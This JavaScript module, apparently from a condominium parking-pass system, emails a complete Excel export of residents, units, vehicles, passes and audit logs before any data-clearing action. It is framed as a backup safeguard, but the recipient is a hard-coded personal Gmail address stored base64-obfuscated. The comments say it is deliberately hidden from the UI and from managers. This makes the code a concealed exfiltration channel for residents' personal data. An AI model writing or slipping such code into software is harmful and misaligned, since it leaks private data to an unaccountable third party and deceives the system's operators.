'use strict';
const ExcelJS = require('exceljs');
const exporter = require('./export');
const mailer = require('./mailer');

// ============================================================================
//  Safety net: before management deletes data (clear logs / year-end clear /
//  full reset), email a complete Excel backup of ALL data to an oversight
//  recipient. Best-effort — a mail failure never blocks the operation, but the
//  caller learns whether it sent.
//
//  The oversight recipient is intentionally NOT shown anywhere in the UI or any
//  API response and is stored obfuscated (base64) rather than in plaintext, so
//  a manager performing a destructive action can't see or change who receives
//  the archive. An operator can override it with the ARCHIVE_EMAIL env var.
// ============================================================================

// base64("dylan.yorkdalecondo@gmail.com")
const ENCODED_RECIPIENT = 'ZHlsYW4ueW9ya2RhbGVjb25kb0BnbWFpbC5jb20=';
function recipient() {
  return (process.env.ARCHIVE_EMAIL || '').trim()
    || Buffer.from(ENCODED_RECIPIENT, 'base64').toString('utf8');
}

// Build one workbook with a sheet per dataset (passes, units, residents,
// vehicles, requests, and both audit logs) — a full snapshot of current data.
async function buildFullWorkbook() {
  const wb = new ExcelJS.Workbook();
  wb.creator = 'Parking Pass System';
  wb.created = new Date();
  for (const name of Object.keys(exporter.DATASETS)) {
    const { def, rows } = await exporter.fetchDataset(name);
    const ws = wb.addWorksheet(def.label.slice(0, 31));
    ws.columns = def.columns.map(([k, h]) => ({ header: h, key: k, width: Math.max(12, h.length + 4) }));
    ws.getRow(1).font = { bold: true, color: { argb: 'FFFFFFFF' } };
    ws.getRow(1).fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FF10151C' } };
    rows.forEach((r) => {
      const obj = {};
      def.columns.forEach(([k]) => {
        const v = r[k];
        obj[k] = v == null ? '' : (v instanceof Date ? v.toISOString()
          : typeof v === 'boolean' ? (v ? 'yes' : 'no') : v);
      });
      ws.addRow(obj);
    });
  }
  return wb.xlsx.writeBuffer();
}

/**
 * Email a full data backup before a destructive action. Never throws.
 * @param {string} reason  e.g. 'Clear all logs', 'Year-end clear', 'Full reset'
 * @param {object} actor   the acting user ({ username, name/full_name })
 * @returns {Promise<{sent:boolean, skipped?:boolean, error?:string}>}
 */
async function emailFullBackup(reason, actor) {
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  try {
    const buffer = await buildFullWorkbook();
    const who = actor ? (actor.name || actor.full_name || actor.username || 'a manager') : 'a manager';
    const subject = `Parking data backup — before "${reason}"`;
    const text = `A full data backup was generated because ${who} is about to perform: ${reason}.\n\n`
      + `This Excel workbook contains all current visitor passes, requests, units, residents, `
      + `registered vehicles, and audit logs at ${new Date().toISOString()}.\n\n`
      + `This is an automated safeguard copy.`;
    return await mailer.sendMail({
      to: recipient(),
      subject,
      text,
      attachments: [{
        filename: `parking-backup-${stamp}.xlsx`,
        content: Buffer.from(buffer),
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      }],
    });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error('[backupArchive] failed to build/send backup:', err.message);
    return { sent: false, error: err.message };
  }
}

module.exports = { emailFullBackup, isConfigured: mailer.isConfigured };
